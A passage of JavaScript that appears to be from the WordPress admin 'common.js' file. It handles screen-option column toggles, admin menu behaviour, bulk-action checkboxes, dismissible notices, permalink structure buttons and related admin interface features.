window.navMenuL10n = window.navMenuL10n || {
	noResultsFound: '',
	warnDeleteMenu: '',
	saveAlert: '',
	untitled: ''
};

window.navMenuL10n = deprecateL10nObject( 'navMenuL10n', window.navMenuL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.commentL10n = window.commentL10n || {
	submittedOn: '',
	dateFormat: ''
};

window.commentL10n = deprecateL10nObject( 'commentL10n', window.commentL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.9.0
 * @deprecated 5.5.0
 */
window.setPostThumbnailL10n = window.setPostThumbnailL10n || {
	setThumbnail: '',
	saving: '',
	error: '',
	done: ''
};

window.setPostThumbnailL10n = deprecateL10nObject( 'setPostThumbnailL10n', window.setPostThumbnailL10n, '5.5.0' );

/**
 * Removed in 6.5.0, needed for back-compatibility.
 *
 * @since 4.5.0
 * @deprecated 6.5.0
 */
window.uiAutocompleteL10n = window.uiAutocompleteL10n || {
	noResults: '',
	oneResult: '',
	manyResults: '',
	itemSelected: ''
};

window.uiAutocompleteL10n = deprecateL10nObject( 'uiAutocompleteL10n', window.uiAutocompleteL10n, '6.5.0' );

/**
 * Removed in 3.3.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 3.3.0
 */
window.adminMenu = {
	init : function() {},
	fold : function() {},
	restoreMenuState : function() {},
	toggle : function() {},
	favorites : function() {}
};

// Show/hide/save table columns.
window.columns = {

	/**
	 * Initializes the column toggles in the screen options.
	 *
	 * Binds an onClick event to the checkboxes to show or hide the table columns
	 * based on their toggled state. And persists the toggled state.
	 *
	 * @since 2.7.0
	 *
	 * @return {void}
	 */
	init : function() {
		var that = this;
		$('.hide-column-tog', '#adv-settings').on( 'click', function() {
			var $t = $(this), column = $t.val();
			if ( $t.prop('checked') )
				that.checked(column);
			else
				that.unchecked(column);

			columns.saveManageColumnsState();
		});
	},

	/**
	 * Saves the toggled state for the columns.
	 *
	 * Saves whether the columns should be shown or hidden on a page.
	 *
	 * @since 3.0.0
	 *
	 * @return {void}
	 */
	saveManageColumnsState : function() {
		var hidden = this.hidden();
		$.post(
			ajaxurl,
			{
				action: 'hidden-columns',
				hidden: hidden,
				screenoptionnonce: $('#screenoptionnonce').val(),
				page: pagenow
			},
			function() {
				wp.a11y.speak( __( 'Screen Options updated.' ) );
			}
		);
	},

	/**
	 * Makes a column visible and adjusts the column span for the table.
	 *
	 * @since 3.0.0
	 * @param {string} column The column name.
	 *
	 * @return {void}
	 */
	checked : function(column) {
		$('.column-' + column).removeClass( 'hidden' );
		this.colSpanChange(+1);
	},

	/**
	 * Hides a column and adjusts the column span for the table.
	 *
	 * @since 3.0.0
	 * @param {string} column The column name.
	 *
	 * @return {void}
	 */
	unchecked : function(column) {
		$('.column-' + column).addClass( 'hidden' );
		this.colSpanChange(-1);
	},

	/**
	 * Gets all hidden columns.
	 *
	 * @since 3.0.0
	 *
	 * @return {string} The hidden column names separated by a comma.
	 */
	hidden : function() {
		return $( '.manage-column[id]' ).filter( '.hidden' ).map(function() {
			return this.id;
		}).get().join( ',' );
	},

	/**
	 * Gets the checked column toggles from the screen options.
	 *
	 * @since 3.0.0
	 *
	 * @return {string} String containing the checked column names.
	 */
	useCheckboxesForHidden : function() {
		this.hidden = function(){
			return $('.hide-column-tog').not(':checked').map(function() {
				var id = this.id;
				return id.substring( id, id.length - 5 );
			}).get().join(',');
		};
	},

	/**
	 * Adjusts the column span for the table.
	 *
	 * @since 3.1.0
	 *
	 * @param {number} diff The modifier for the column span.
	 */
	colSpanChange : function(diff) {
		var $t = $('table').find('.colspanchange'), n;
		if ( !$t.length )
			return;
		n = parseInt( $t.attr('colspan'), 10 ) + diff;
		$t.attr('colspan', n.toString());
	}
};

$( function() { columns.init(); } );

/**
 * Validates that the required form fields are not empty.
 *
 * @since 2.9.0
 *
 * @param {jQuery} form The form to validate.
 *
 * @return {boolean} Returns true if all required fields are not an empty string.
 */
window.validateForm = function( form ) {
	return !$( form )
		.find( '.form-required' )
		.filter( function() { return $( ':input:visible', this ).val() === ''; } )
		.addClass( 'form-invalid' )
		.find( ':input:visible' )
		.on( 'change', function() { $( this ).closest( '.form-invalid' ).removeClass( 'form-invalid' ); } )
		.length;
};

// Stub for doing better warnings.
/**
 * Shows message pop-up notice or confirmation message.
 *
 * @since 2.7.0
 *
 * @type {{warn: showNotice.warn, note: showNotice.note}}
 *
 * @return {void}
 */
window.showNotice = {

	/**
	 * Shows a delete confirmation pop-up message.
	 *
	 * @since 2.7.0
	 *
	 * @return {boolean} Returns true if the message is confirmed.
	 */
	warn : function() {
		if ( confirm( __( 'You are about to permanently delete these items from your site.\nThis action cannot be undone.\n\'Cancel\' to stop, \'OK\' to delete.' ) ) ) {
			return true;
		}

		return false;
	},

	/**
	 * Shows an alert message.
	 *
	 * @since 2.7.0
	 *
	 * @param text The text to display in the message.
	 */
	note : function(text) {
		alert(text);
	}
};

/**
 * Represents the functions for the meta screen options panel.
 *
 * @since 3.2.0
 *
 * @type {{element: null, toggles: null, page: null, init: screenMeta.init,
 *         toggleEvent: screenMeta.toggleEvent, open: screenMeta.open,
 *         close: screenMeta.close}}
 *
 * @return {void}
 */
window.screenMeta = {
	element: null, // #screen-meta
	toggles: null, // .screen-meta-toggle
	page:    null, // #wpcontent

	/**
	 * Initializes the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @return {void}
	 */
	init: function() {
		this.element = $('#screen-meta');
		this.toggles = $( '#screen-meta-links' ).find( '.show-settings' );
		this.page    = $('#wpcontent');

		this.toggles.on( 'click', this.toggleEvent );
	},

	/**
	 * Toggles the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @return {void}
	 */
	toggleEvent: function() {
		var panel = $( '#' + $( this ).attr( 'aria-controls' ) );

		if ( !panel.length )
			return;

		if ( panel.is(':visible') )
			screenMeta.close( panel, $(this) );
		else
			screenMeta.open( panel, $(this) );
	},

	/**
	 * Opens the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @param {jQuery} panel  The screen meta options panel div.
	 * @param {jQuery} button The toggle button.
	 *
	 * @return {void}
	 */
	open: function( panel, button ) {

		$( '#screen-meta-links' ).find( '.screen-meta-toggle' ).not( button.parent() ).css( 'visibility', 'hidden' );

		panel.parent().show();

		/**
		 * Sets the focus to the meta options panel and adds the necessary CSS classes.
		 *
		 * @since 3.2.0
		 *
		 * @return {void}
		 */
		panel.slideDown( 'fast', function() {
			panel.removeClass( 'hidden' ).trigger( 'focus' );
			button.addClass( 'screen-meta-active' ).attr( 'aria-expanded', true );
		});

		$document.trigger( 'screen:options:open' );
	},

	/**
	 * Closes the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @param {jQuery} panel  The screen meta options panel div.
	 * @param {jQuery} button The toggle button.
	 *
	 * @return {void}
	 */
	close: function( panel, button ) {
		/**
		 * Hides the screen meta options panel.
		 *
		 * @since 3.2.0
		 *
		 * @return {void}
		 */
		panel.slideUp( 'fast', function() {
			button.removeClass( 'screen-meta-active' ).attr( 'aria-expanded', false );
			$('.screen-meta-toggle').css('visibility', '');
			panel.parent().hide();
			panel.addClass( 'hidden' );
		});

		$document.trigger( 'screen:options:close' );
	}
};

/**
 * Initializes the help tabs in the help panel.
 *
 * @param {Event} e The event object.
 *
 * @return {void}
 */
$('.contextual-help-tabs').on( 'click', 'a', function(e) {
	var link = $(this),
		panel;

	e.preventDefault();

	// Don't do anything if the click is for the tab already showing.
	if ( link.is('.active a') )
		return false;

	// Links.
	$('.contextual-help-tabs .active').removeClass('active');
	link.parent('li').addClass('active');

	panel = $( link.attr('href') );

	// Panels.
	$('.help-tab-content').not( panel ).removeClass('active').hide();
	panel.addClass('active').show();
});

/**
 * Update custom permalink structure via buttons.
 */
var permalinkStructureFocused = false,
    $permalinkStructure       = $( '#permalink_structure' ),
    $permalinkStructureInputs = $( '.permalink-structure input:radio' ),
    $permalinkCustomSelection = $( '#custom_selection' ),
    $availableStructureTags   = $( '.form-table.permalink-structure .available-structure-tags button' );

// Change permalink structure input when selecting one of the common structures.
$permalinkStructureInputs.on( 'change', function() {
	if ( 'custom' === this.value ) {
		return;
	}

	$permalinkStructure.val( this.value );

	// Update button states after selection.
	$availableStructureTags.each( function() {
		changeStructureTagButtonState( $( this ) );
	} );
} );

$permalinkStructure.on( 'click input', function() {
	$permalinkCustomSelection.prop( 'checked', true );
} );

// Check if the permalink structure input field has had focus at least once.
$permalinkStructure.on( 'focus', function( event ) {
	permalinkStructureFocused = true;
	$( this ).off( event );
} );

/**
 * Enables or disables a structure tag button depending on its usage.
 *
 * If the structure is already used in the custom permalink structure,
 * it will be disabled.
 *
 * @param {Object} button Button jQuery object.
 */
function changeStructureTagButtonState( button ) {
	if ( -1 !== $permalinkStructure.val().indexOf( button.text().trim() ) ) {
		button.attr( 'data-label', button.attr( 'aria-label' ) );
		button.attr( 'aria-label', button.attr( 'data-used' ) );
		button.attr( 'aria-pressed', true );
		button.addClass( 'active' );
	} else if ( button.attr( 'data-label' ) ) {
		button.attr( 'aria-label', button.attr( 'data-label' ) );
		button.attr( 'aria-pressed', false );
		button.removeClass( 'active' );
	}
}

// Check initial button state.
$availableStructureTags.each( function() {
	changeStructureTagButtonState( $( this ) );
} );

// Observe permalink structure field and disable buttons of tags that are already present.
$permalinkStructure.on( 'change', function() {
	$availableStructureTags.each( function() {
		changeStructureTagButtonState( $( this ) );
	} );
} );

$availableStructureTags.on( 'click', function() {
	var permalinkStructureValue = $permalinkStructure.val(),
	    selectionStart          = $permalinkStructure[ 0 ].selectionStart,
	    selectionEnd            = $permalinkStructure[ 0 ].selectionEnd,
	    textToAppend            = $( this ).text().trim(),
	    textToAnnounce,
	    newSelectionStart;

	if ( $( this ).hasClass( 'active' ) ) {
		textToAnnounce = $( this ).attr( 'data-removed' );
	} else {
		textToAnnounce = $( this ).attr( 'data-added' );
	}

	// Remove structure tag if already part of the structure.
	if ( -1 !== permalinkStructureValue.indexOf( textToAppend ) ) {
		permalinkStructureValue = permalinkStructureValue.replace( textToAppend + '/', '' );

		$permalinkStructure.val( '/' === permalinkStructureValue ? '' : permalinkStructureValue );

		// Announce change to screen readers.
		$( '#custom_selection_updated' ).text( textToAnnounce );

		// Disable button.
		changeStructureTagButtonState( $( this ) );

		return;
	}

	// Input field never had focus, move selection to end of input.
	if ( ! permalinkStructureFocused && 0 === selectionStart && 0 === selectionEnd ) {
		selectionStart = selectionEnd = permalinkStructureValue.length;
	}

	$permalinkCustomSelection.prop( 'checked', true );

	// Prepend and append slashes if necessary.
	if ( '/' !== permalinkStructureValue.substr( 0, selectionStart ).substr( -1 ) ) {
		textToAppend = '/' + textToAppend;
	}

	if ( '/' !== permalinkStructureValue.substr( selectionEnd, 1 ) ) {
		textToAppend = textToAppend + '/';
	}

	// Insert structure tag at the specified position.
	$permalinkStructure.val( permalinkStructureValue.substr( 0, selectionStart ) + textToAppend + permalinkStructureValue.substr( selectionEnd ) );

	// Announce change to screen readers.
	$( '#custom_selection_updated' ).text( textToAnnounce );

	// Disable button.
	changeStructureTagButtonState( $( this ) );

	// If input had focus give it back with cursor right after appended text.
	if ( permalinkStructureFocused && $permalinkStructure[0].setSelectionRange ) {
		newSelectionStart = ( permalinkStructureValue.substr( 0, selectionStart ) + textToAppend ).length;
		$permalinkStructure[0].setSelectionRange( newSelectionStart, newSelectionStart );
		$permalinkStructure.trigger( 'focus' );
	}
} );

$( function() {
	var checks, first, last, checked, sliced, mobileEvent, transitionTimeout, focusedRowActions,
		lastClicked = false,
		pageInput = $('input.current-page'),
		currentPage = pageInput.val(),
		isIOS = /iPhone|iPad|iPod/.test( navigator.userAgent ),
		isAndroid = navigator.userAgent.indexOf( 'Android' ) !== -1,
		$adminMenuWrap = $( '#adminmenuwrap' ),
		$wpwrap = $( '#wpwrap' ),
		$adminmenu = $( '#adminmenu' ),
		$overlay = $( '#wp-responsive-overlay' ),
		$toolbar = $( '#wp-toolbar' ),
		$toolbarPopups = $toolbar.find( 'a[aria-haspopup="true"]' ),
		$sortables = $('.meta-box-sortables'),
		wpResponsiveActive = false,
		$adminbar = $( '#wpadminbar' ),
		lastScrollPosition = 0,
		pinnedMenuTop = false,
		pinnedMenuBottom = false,
		menuTop = 0,
		menuState,
		menuIsPinned = false,
		height = {
			window: $window.height(),
			wpwrap: $wpwrap.height(),
			adminbar: $adminbar.height(),
			menu: $adminMenuWrap.height()
		},
		$headerEnd = $( '.wp-header-end' );

	/**
	 * Makes the fly-out submenu header clickable, when the menu is folded.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
	 */
	$adminmenu.on('click.wp-submenu-head', '.wp-submenu-head', function(e){
		$(e.target).parent().siblings('a').get(0).click();
	});

	/**
	 * Collapses the admin menu.
	 *
	 * @return {void}
	 */
	$( '#collapse-button' ).on( 'click.collapse-menu', function() {
		var viewportWidth = getViewportWidth() || 961;

		// Reset any compensation for submenus near the bottom of the screen.
		$('#adminmenu div.wp-submenu').css('margin-top', '');

		if ( viewportWidth <= 960 ) {
			if ( $body.hasClass('auto-fold') ) {
				$body.removeClass('auto-fold').removeClass('folded');
				setUserSetting('unfold', 1);
				setUserSetting('mfold', 'o');
				menuState = 'open';
			} else {
				$body.addClass('auto-fold');
				setUserSetting('unfold', 0);
				menuState = 'folded';
			}
		} else {
			if ( $body.hasClass('folded') ) {
				$body.removeClass('folded');
				setUserSetting('mfold', 'o');
				menuState = 'open';
			} else {
				$body.addClass('folded');
				setUserSetting('mfold', 'f');
				menuState = 'folded';
			}
		}

		$document.trigger( 'wp-collapse-menu', { state: menuState } );
	});

	/**
	 * Ensures an admin submenu is within the visual viewport.
	 *
	 * @since 4.1.0
	 *
	 * @param {jQuery} $menuItem The parent menu item containing the submenu.
	 *
	 * @return {void}
	 */
	function adjustSubmenu( $menuItem ) {
		var bottomOffset, pageHeight, adjustment, theFold, menutop, wintop, maxtop,
			$submenu = $menuItem.find( '.wp-submenu' );

		menutop = $menuItem.offset().top;
		wintop = $window.scrollTop();
		maxtop = menutop - wintop - 30; // max = make the top of the sub almost touch admin bar.

		bottomOffset = menutop + $submenu.height() + 1; // Bottom offset of the menu.
		pageHeight = $wpwrap.height();                  // Height of the entire page.
		adjustment = 60 + bottomOffset - pageHeight;
		theFold = $window.height() + wintop - 50;       // The fold.

		if ( theFold < ( bottomOffset - adjustment ) ) {
			adjustment = bottomOffset - theFold;
		}

		if ( adjustment > maxtop ) {
			adjustment = maxtop;
		}

		if ( adjustment > 1 && $('#wp-admin-bar-menu-toggle').is(':hidden') ) {
			$submenu.css( 'margin-top', '-' + adjustment + 'px' );
		} else {
			$submenu.css( 'margin-top', '' );
		}
	}

	if ( 'ontouchstart' in window || /IEMobile\/[1-9]/.test(navigator.userAgent) ) { // Touch screen device.
		// iOS Safari works with touchstart, the rest work with click.
		mobileEvent = isIOS ? 'touchstart' : 'click';

		/**
		 * Closes any open submenus when touch/click is not on the menu.
		 *
		 * @param {Event} e The event object.
		 *
		 * @return {void}
		 */
		$body.on( mobileEvent+'.wp-mobile-hover', function(e) {
			if ( $adminmenu.data('wp-responsive') ) {
				return;
			}

			if ( ! $( e.target ).closest( '#adminmenu' ).length ) {
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
			}
		});

		/**
		 * Handles the opening or closing the submenu based on the mobile click|touch event.
		 *
		 * @param {Event} event The event object.
		 *
		 * @return {void}
		 */
		$adminmenu.find( 'a.wp-has-submenu' ).on( mobileEvent + '.wp-mobile-hover', function( event ) {
			var $menuItem = $(this).parent();

			if ( $adminmenu.data( 'wp-responsive' ) ) {
				return;
			}

			/*
			 * Show the sub instead of following the link if:
			 * 	- the submenu is not open.
			 * 	- the submenu is not shown inline or the menu is not folded.
			 */
			if ( ! $menuItem.hasClass( 'opensub' ) && ( ! $menuItem.hasClass( 'wp-menu-open' ) || $menuItem.width() < 40 ) ) {
				event.preventDefault();
				adjustSubmenu( $menuItem );
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
				$menuItem.addClass('opensub');
			}
		});
	}

	if ( ! isIOS && ! isAndroid ) {
		$adminmenu.find( 'li.wp-has-submenu' ).hoverIntent({

			/**
			 * Opens the submenu when hovered over the menu item for desktops.
			 *
			 * @return {void}
			 */
			over: function() {
				var $menuItem = $( this ),
					$submenu = $menuItem.find( '.wp-submenu' ),
					top = parseInt( $submenu.css( 'top' ), 10 );

				if ( isNaN( top ) || top > -5 ) { // The submenu is visible.
					return;
				}

				if ( $adminmenu.data( 'wp-responsive' ) ) {
					// The menu is in responsive mode, bail.
					return;
				}

				adjustSubmenu( $menuItem );
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
				$menuItem.addClass( 'opensub' );
			},

			/**
			 * Closes the submenu when no longer hovering the menu item.
			 *
			 * @return {void}
			 */
			out: function(){
				if ( $adminmenu.data( 'wp-responsive' ) ) {
					// The menu is in responsive mode, bail.
					return;
				}

				$( this ).removeClass( 'opensub' ).find( '.wp-submenu' ).css( 'margin-top', '' );
			},
			timeout: 200,
			sensitivity: 7,
			interval: 90
		});

		/**
		 * Opens the submenu on when focused on the menu item.
		 *
		 * @param {Event} event The event object.
		 *
		 * @return {void}
		 */
		$adminmenu.on( 'focus.adminmenu', '.wp-submenu a', function( event ) {
			if ( $adminmenu.data( 'wp-responsive' ) ) {
				// The menu is in responsive mode, bail.
				return;
			}

			$( event.target ).closest( 'li.menu-top' ).addClass( 'opensub' );

			/**
			 * Closes the submenu on blur from the menu item.
			 *
			 * @param {Event} event The event object.
			 *
			 * @return {void}
			 */
		}).on( 'blur.adminmenu', '.wp-submenu a', function( event ) {
			if ( $adminmenu.data( 'wp-responsive' ) ) {
				return;
			}

			$( event.target ).closest( 'li.menu-top' ).removeClass( 'opensub' );

			/**
			 * Adjusts the size for the submenu.
			 *
			 * @return {void}
			 */
		}).find( 'li.wp-has-submenu.wp-not-current-submenu' ).on( 'focusin.adminmenu', function() {
			adjustSubmenu( $( this ) );
		});
	}

	/*
	 * The `.below-h2` class is here just for backward compatibility with plugins
	 * that are (incorrectly) using it. Do not use. Use `.inline` instead. See #34570.
	 * If '.wp-header-end' is found, append the notices after it otherwise
	 * after the first h1 or h2 heading found within the main content.
	 */
	if ( ! $headerEnd.length ) {
		$headerEnd = $( '.wrap h1, .wrap h2' ).first();
	}
	$( 'div.updated, div.error, div.notice' ).not( '.inline, .below-h2' ).insertAfter( $headerEnd );

	/**
	 * Makes notices dismissible.
	 *
	 * @since 4.4.0
	 *
	 * @return {void}
	 */
	function makeNoticesDismissible() {
		$( '.notice.is-dismissible' ).each( function() {
			var $el = $( this ),
				$button = $( '<button type="button" class="notice-dismiss"><span class="screen-reader-text"></span></button>' );

			if ( $el.find( '.notice-dismiss' ).length ) {
				return;
			}

			// Ensure plain text.
			$button.find( '.screen-reader-text' ).text( __( 'Dismiss this notice.' ) );
			$button.on( 'click.wp-dismiss-notice', function( event ) {
				event.preventDefault();
				$el.fadeTo( 100, 0, function() {
					$el.slideUp( 100, function() {
						$el.remove();
					});
				});
			});

			$el.append( $button );
		});
	}

	$document.on( 'wp-updates-notice-added wp-plugin-install-error wp-plugin-update-error wp-plugin-delete-error wp-theme-install-error wp-theme-delete-error wp-notice-added', makeNoticesDismissible );

	// Init screen meta.
	screenMeta.init();

	/**
	 * Checks a checkbox.
	 *
	 * This event needs to be delegated. Ticket #37973.
	 *
	 * @return {boolean} Returns whether a checkbox is checked or not.
	 */
	$body.on( 'click', 'tbody > tr > .check-column :checkbox', function( event ) {
		// Shift click to select a range of checkboxes.
		if ( 'undefined' == event.shiftKey ) { return true; }
		if ( event.shiftKey ) {
			if ( !lastClicked ) { return true; }
			checks = $( lastClicked ).closest( 'form' ).find( ':checkbox' ).filter( ':visible:enabled' );
			first = checks.index( lastClicked );
			last = checks.index( this );
			checked = $(this).prop('checked');
			if ( 0 < first && 0 < last && first != last ) {
				sliced = ( last > first ) ? checks.slice( first, last ) : checks.slice( last, first );
				sliced.prop( 'checked', function() {
					if ( $(this).closest('tr').is(':visible') )
						return checked;

					return false;
				});
			}
		}
		lastClicked = this;

		// Toggle the "Select all" checkboxes depending if the other ones are all checked or not.
		var unchecked = $(this).closest('tbody').find('tr').find(':checkbox').filter(':visible:enabled').not(':checked');

		/**
		 * Determines if all checkboxes are checked.
		 *
		 * @return {boolean} Returns true if there are no unchecked checkboxes.
		 */
		$(this).closest('table').children('thead, tfoot').find(':checkbox').prop('checked', function() {
			return ( 0 === unchecked.length );
		});

		return true;
	});

	/**
	 * Controls all the toggles on bulk toggle change.
	 *
	 * When the bulk checkbox is changed, all the checkboxes in the tables are changed accordingly.
	 * When the shift-button is pressed while changing the bulk checkbox the checkboxes in the table are inverted.
	 *
	 * This event needs to be delegated. Ticket #37973.
	 *
	 * @param {Event} event The event object.
	 *
	 * @return {boolean}
	 */
	$body.on( 'click.wp-toggle-checkboxes', 'thead .check-column :checkbox, tfoot .check-column :checkbox', function( event ) {
		var $this = $(this),
			$table = $this.closest( 'table' ),
			controlChecked = $this.prop('checked'),
			toggle = event.shiftKey || $this.data('wp-toggle');

		$table.children( 'tbody' ).filter(':visible')
			.children().children('.check-column').find(':checkbox')
			/**
			 * Updates the checked state on the checkbox in the table.
			 *
			 * @return {boolean} True checks the checkbox, False unchecks the checkbox.
			 */
			.prop('checked', function() {
				if ( $(this).is(':hidden,:disabled') ) {
					return false;
				}

				if ( toggle ) {
					return ! $(this).prop( 'checked' );
				} else if ( controlChecked ) {
					return true;
				}

				return false;
			});

		$table.children('thead,  tfoot').filter(':visible')
			.children().children('.check-column').find(':checkbox')

			/**
			 * Syncs the bulk checkboxes on the top and bottom of the table.
			 *
			 * @return {boolean} True checks the checkbox, False unchecks the checkbox.
			 */
			.prop('checked', function() {
				if ( toggle ) {
					return false;
				} else if ( controlChecked ) {
					return true;
				}

				return false;
			});
	});

	/**
	 * Marries a secondary control to its primary control.
	 *
	 * @param {jQuery} topSelector    The top selector element.
	 * @param {jQuery} topSubmit      The top submit element.
	 * @param {jQuery} bottomSelector The bottom selector element.
	 * @param {jQuery} bottomSubmit   The bottom submit element.
	 * @return {void}
	 */
	function marryControls( topSelector, topSubmit, bottomSelector, bottomSubmit ) {
		/**
		 * Updates the primary selector when the secondary selector is changed.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function updateTopSelector() {
			topSelector.val($(this).val());
		}
		bottomSelector.on('change', updateTopSelector);

		/**
		 * Updates the secondary selector when the primary selector is changed.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function updateBottomSelector() {
			bottomSelector.val($(this).val());
		}
		topSelector.on('change', updateBottomSelector);

		/**
		 * Triggers the primary submit when then secondary submit is clicked.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function triggerSubmitClick(e) {
			e.preventDefault();
			e.stopPropagation();

			topSubmit.trigger('click');
		}
		bottomSubmit.on('click', triggerSubmitClick);
	}

	// Marry the secondary "Bulk actions" controls to the primary controls:
	marryControls( $('#bulk-action-selector-top'), $('#doaction'), $('#bulk-action-selector-bottom'), $('#doaction2') );

	// Marry the secondary "Change role to" controls to the primary controls:
	marryControls( $('#new_role'), $('#changeit'), $('#new_role2'), $('#changeit2') );

	var addAdminNotice = function( data ) {
		var $notice = $( data.selector ),
			$headerEnd = $( '.wp-header-end' ),
			type,
			dismissible,
			$adminNotice;

		delete data.selector;

		dismissible = ( data.dismissible && data.dismissible === true ) ? ' is-dismissible' : '';
		type        = ( data.type ) ? data.type : 'info';

		$adminNotice = '<div id="' + data.id + '" class="notice notice-' + data.type + dismissible + '"><p>' + data.message + '</p></div>';

		// Check if this admin notice already exists.
		if ( ! $notice.length ) {
			$notice = $( '#' + data.id );
		}

		if ( $notice.length ) {
			$notice.replaceWith( $adminNotice );
		} else if ( $headerEnd.length ) {
			$headerEnd.after( $adminNotice );
		} else {
			if ( 'customize' === pagenow ) {
				$( '.customize-themes-notifications' ).append( $adminNotice );
			} else {
				$( '.wrap' ).find( '> h1' ).after( $adminNotice );
			}
		}

		$document.trigger( 'wp-notice-added' );
	};

	$( '.bulkactions' ).parents( 'form' ).on( 'submit', function( event ) {
		var form = this,
			submitterName = event.originalEvent && event.originalEvent.submitter ? event.originalEvent.submitter.name : false,
			currentPageSelector = form.querySelector( '#current-page-selector' );

		if ( currentPageSelector && currentPageSelector.defaultValue !== currentPageSelector.value ) {
			return; // Pagination form submission.
		}

		// Observe submissions from posts lists for 'bulk_action' or users lists for 'new_role'.
		var bulkFieldRelations = {
			'bulk_action' : window.bulkActionObserverIds.bulk_action,
			'changeit' : window.bulkActionObserverIds.changeit
		};
		if ( ! Object.keys( bulkFieldRelations ).includes( submitterName ) ) {
			return;
		}

		var values = new FormData(form);
		var value = values.get( bulkFieldRelations[ submitterName ] ) || '-1';

		// Check that the action is not the default one.
		if ( value !== '-1' ) {
			// Check that at least one item is selected.
			var itemsSelected = form.querySelectorAll( '.wp-list-table tbody .check-column input[type="checkbox"]:checked' );

			if ( itemsSelected.length > 0 ) {
				return;
			}
		}
		event.preventDefault();
		event.stopPropagation();
		$( 'html, body' ).animate( { scrollTop: 0 } );

		var errorMessage = __( 'Please select at least one item to perform this action on.' );
		addAdminNotice( {
			id: 'no-items-selected',
			type: 'error',
			message: errorMessage,
			dismissible: true,
		} );

		wp.a11y.speak( errorMessage );
	});

	/**
	 * Shows row actions on focus of its parent container element or any other elements contained within.
	 *
	 * @return {void}
	 */
	$( '#wpbody-content' ).on({
		focusin: function() {
			clearTimeout( transitionTimeout );
			focusedRowActions = $( this ).find( '.row-actions' );
			// transitionTimeout is necessary for Firefox, but Chrome won't remove the CSS class without a little help.
			$( '.row-actions' ).not( this ).removeClass( 'visible' );
			focusedRowActions.addClass( 'visible' );
		},
		focusout: function() {
			// Tabbing between post title and .row-actions links needs a brief pause, otherwise
			// the .row-actions div gets hidden in transit in some browsers (ahem, Firefox).
			transitionTimeout = setTimeout( function() {
				focusedRowActions.removeClass( 'visible' );
			}, 30 );
		}
	}, '.table-view-list .has-row-actions' );

	// Toggle list table rows on small screens.
	$( 'tbody' ).on( 'click', '.toggle-row', function() {
		$( this ).closest( 'tr' ).toggleClass( 'is-expanded' );
	});

	$('#default-password-nag-no').on( 'click', function() {
		setUserSetting('default_password_nag', 'hide');
		$('div.default-password-nag').hide();
		return false;
	});

	/**
	 * Handles tab keypresses in theme and plugin file editor textareas.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
	 */
	$('#newcontent').on('keydown.wpevent_InsertTab', function(e) {
		var el = e.target, selStart, selEnd, val, scroll, sel;

		// After pressing escape key (keyCode: 27), the tab key should tab out of the textarea.
		if ( e.keyCode == 27 ) {
			// When pressing Escape: Opera 12 and 27 blur form fields, IE 8 clears them.
			e.preventDefault();
			$(el).data('tab-out', true);
			return;
		}

		// Only listen for plain tab key (keyCode: 9) without any modifiers.
		if ( e.keyCode != 9 || e.ctrlKey || e.altKey || e.shiftKey )
			return;

		// After tabbing out, reset it so next time the tab key can be used again.
		if ( $(el).data('tab-out') ) {
			$(el).data('tab-out', false);
			return;
		}

		selStart = el.selectionStart;
		selEnd = el.selectionEnd;
		val = el.value;

		// If any text is selected, replace the selection with a tab character.
		if ( document.selection ) {
			el.focus();
			sel = document.selection.createRange();
			sel.text = '\t';
		} else if ( selStart >= 0 ) {
			scroll = this.scrollTop;
			el.value = val.substring(0, selStart).concat('\t', val.substring(selEnd) );
			el.selectionStart = el.selectionEnd = selStart + 1;
			this.scrollTop = scroll;
		}

		// Cancel the regular tab functionality, to prevent losing focus of the textarea.
		if ( e.stopPropagation )
			e.stopPropagation();
		if ( e.preventDefault )
			e.preventDefault();
	});

	// Reset page number variable for new filters/searches but not for bulk actions. See #17685.
	if ( pageInput.length ) {

		/**
		 * Handles pagination variable when filtering the list table.
		 *
		 * Set the pagination argument to the first page when the post-filter form is submitted.
		 * This happens when pressing the 'filter' button on the list table page.
		 *
		 * The pagination argument should not be touched when the bulk action dropdowns are set to do anything.
		 *
		 * The form closest to the pageInput is the post-filter form.
		 *
		 * @return {void}
		 */
		pageInput.closest('form').on( 'submit', function() {
			/*
			 * action = bulk action dropdown at the top of the table
			 */
			if ( $('select[name="action"]').val() == -1 && pageInput.val() == currentPage )
				pageInput.val('1');
		});
	}

	/**
	 * Resets the bulk actions when the search button is clicked.
	 *
	 * @return {void}
	 */
	$('.search-box input[type="search"], .search-box input[type="submit"]').on( 'mousedown', function () {
		$('select[name^="action"]').val('-1');
	});

	/**
	 * Scrolls into view when focus.scroll-into-view is triggered.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
 	 */
	$('#contextual-help-link, #show-settings-link').on( 'focus.scroll-into-view', function(e){
		if ( e.target.scrollIntoViewIfNeeded )
			e.target.scrollIntoViewIfNeeded(false);
	});

	/**
	 * Disables the submit upload buttons when no data is entered.
	 *
	 * @return {void}
	 */
	(function(){
		var button, input, form = $('form.wp-upload-form');

		// Exit when no upload form is found.
		if ( ! form.length )
			return;

		button = form.find('input[type="submit"]');
		input = form.find('input[type="file"]');

		/**
		 * Determines if any data is entered in any file upload input.
		 *
		 * @since 3.5.0
		 *
		 * @return {void}
		 */
		function toggleUploadButton() {
			// When no inputs have a value, disable the upload buttons.
			button.prop('disabled', '' === input.map( function() {
				return $(this).val();
			}).get().join(''));
		}

		// Update the status initially.
		toggleUploadButton();
		// Update the status when any file input changes.
		input.on('change', toggleUploadButton);
	})();

	/**
	 * Pins the menu while distraction-free writing is enabled.
	 *
	 * @param {Event} event Event data.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function pinMenu( event ) {
